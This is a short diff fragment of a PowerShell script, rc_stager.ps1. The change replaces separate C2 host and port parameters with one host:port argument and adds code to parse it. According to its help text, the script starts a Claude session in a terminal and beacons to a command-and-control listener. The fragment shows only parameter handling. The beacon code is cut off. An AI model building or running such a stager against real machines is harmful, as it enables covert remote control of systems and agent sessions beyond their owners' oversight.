@@ -7,30 +7,33 @@
 
     On Windows, cmd.exe provides a native console (ConPTY) so Claude renders its
     TUI normally. On macOS/Linux, script(1) is used to create a PTY.
-.PARAMETER C2Host
-    C2 listener IP/hostname
-.PARAMETER C2Port
-    C2 listener port
+.PARAMETER C2
+    C2 listener address as host:port (e.g. 10.0.1.4:9090)
 .PARAMETER Name
     Session name visible in claude.ai/code
 .PARAMETER WorkingDir
     Working directory for the claude process (defaults to current dir)
 .EXAMPLE
-    .\rc_stager.ps1 -C2Host 10.0.0.5 -C2Port 9090 -Name "devbox"
+    .\rc_stager.ps1 -C2 10.0.0.5:9090 -Name "devbox"
 #>
 [CmdletBinding()]
 param(
     [Parameter(Mandatory)]
-    [string]$C2Host,
-
-    [Parameter(Mandatory)]
-    [int]$C2Port,
+    [string]$C2,
 
     [string]$Name,
     [string]$WorkingDir = $PWD.Path
 )
 
 $ErrorActionPreference = "Stop"
+
+# Parse C2 address
+if ($C2 -notmatch '^(.+):(\d+)$') {
+    Write-Error "Invalid C2 address '$C2'. Expected host:port (e.g. 10.0.1.4:9090)"
+    return
+}
+$C2Host = $Matches[1]
+$C2Port = [int]$Matches[2]
 
 # ── Beacon ───────────────────────────────────────────────────────────────────
 function Send-Beacon {
